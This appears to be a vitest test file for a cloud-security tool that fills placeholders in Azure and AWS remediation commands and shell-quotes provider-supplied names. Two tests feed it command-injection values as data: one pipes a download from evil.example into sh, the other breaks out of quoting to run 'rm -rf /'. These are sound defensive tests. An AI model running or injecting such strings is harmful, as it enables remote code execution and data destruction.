import { describe, expect, it } from "vitest";

import { fillPlaceholders, placeholderValues } from "@/lib/remediationFill";

const ARM =
  "/subscriptions/3f2a9c1e-0000-0000-0000-000000000000/resourceGroups/rg-data/providers/Microsoft.Storage/storageAccounts/stprod";

describe("filling a fix command from its resource", () => {
  it("fills the resource group and the resource's own name", () => {
    const values = placeholderValues(
      { name: "stprod", resource_type: "storage_account", region: "westeurope" },
      ARM,
    );
    const { text, filled } = fillPlaceholders(
      "az storage account update --name <account> --resource-group <rg> --allow-blob-public-access false",
      values,
    );

    expect(text).toBe(
      "az storage account update --name stprod --resource-group rg-data --allow-blob-public-access false",
    );
    expect(filled.sort()).toEqual(["account", "rg"]);
  });

  it("never fills a placeholder for some other resource the command names", () => {
    // `<rule>` is a rule on the NSG, not the NSG. Guessing it would be a
    // command with a made-up value in it, which is the thing to never ship.
    const values = placeholderValues(
      { name: "nsg-jump", resource_type: "network_security_group", region: null },
      "/subscriptions/s1/resourceGroups/rg-ops/providers/Microsoft.Network/networkSecurityGroups/nsg-jump",
    );
    const { text } = fillPlaceholders(
      "az network nsg rule delete --nsg-name <nsg> --resource-group <rg> --name <rule>",
      values,
    );

    expect(text).toBe("az network nsg rule delete --nsg-name nsg-jump --resource-group rg-ops --name <rule>");
  });

  it("does not use a name for a placeholder of a different kind", () => {
    const values = placeholderValues(
      { name: "vm-1", resource_type: "virtual_machine", region: null },
      null,
    );
    expect(fillPlaceholders("--server <server> --vm <vm>", values).text).toBe(
      "--server <server> --vm vm-1",
    );
  });

  it("leaves everything alone when nothing is known", () => {
    const values = placeholderValues(
      { name: "ci-deployer", resource_type: "service_principal", region: null },
      "/directory/servicePrincipals/abc",
    );
    const { text, filled } = fillPlaceholders("az role assignment delete --assignee <object-id>", values);
    expect(text).toBe("az role assignment delete --assignee <object-id>");
    expect(filled).toEqual([]);
  });
});

describe("quoting what came out of somebody else's cloud", () => {
  // CloudGuard does not run these commands; it hands them to a person who
  // pastes them into a shell. The values in them are provider-supplied
  // strings, so the quoting is this file's problem or nobody's.

  it("leaves an ordinary identifier exactly as the rule wrote it", () => {
    const { text } = fillPlaceholders("az group show --name <rg>", { rg: "rg-data_01.prod" });

    expect(text).toBe("az group show --name rg-data_01.prod");
  });

  it("quotes a name that is more than one shell word", () => {
    const { text, filled } = fillPlaceholders("az group show --name <rg>", {
      rg: "rg (west europe)",
    });

    expect(text).toBe("az group show --name 'rg (west europe)'");
    expect(filled).toEqual(["rg"]);
  });

  it("neutralises a name that tries to end the command", () => {
    const { text } = fillPlaceholders(
      "az storage account update --name <account> --allow-blob-public-access false",
      { account: "st; curl evil.example/x | sh" },
    );

    expect(text).toBe(
      "az storage account update --name 'st; curl evil.example/x | sh' --allow-blob-public-access false",
    );
    // Everything after the name is one quoted argument, so no shell
    // metacharacter in it is a metacharacter any more.
    expect(text).not.toMatch(/--name st; curl/);
  });

  it("breaks an embedded single quote out of the quoting", () => {
    const { text } = fillPlaceholders("az group show --name <rg>", {
      rg: "rg'; rm -rf /; echo '",
    });

    expect(text).toBe("az group show --name 'rg'\\''; rm -rf /; echo '\\'''");
  });

  it("leaves a placeholder inside a quoted argument unfilled rather than nesting quotes", () => {
    // Quoting here would produce a command that is wrong rather than one that
    // is dangerous, and a bracket asks the reader for a value they can supply.
    const command =
      'aws s3api put-bucket-logging --bucket <bucket> --bucket-logging-status \'{"TargetBucket":"<bucket>"}\'';
    const { text, filled } = fillPlaceholders(command, { bucket: "logs bucket" });

    expect(text).toBe(
      'aws s3api put-bucket-logging --bucket \'logs bucket\' --bucket-logging-status \'{"TargetBucket":"<bucket>"}\'',
    );
    expect(filled).toEqual(["bucket"]);
  });

  it("still fills a quoted position when the value needs no quoting", () => {
    const command = 'aws s3api put-bucket-logging --bucket-logging-status \'{"TargetBucket":"<bucket>"}\'';
    const { text } = fillPlaceholders(command, { bucket: "cg-logs" });

    expect(text).toBe('aws s3api put-bucket-logging --bucket-logging-status \'{"TargetBucket":"cg-logs"}\'');
  });
});
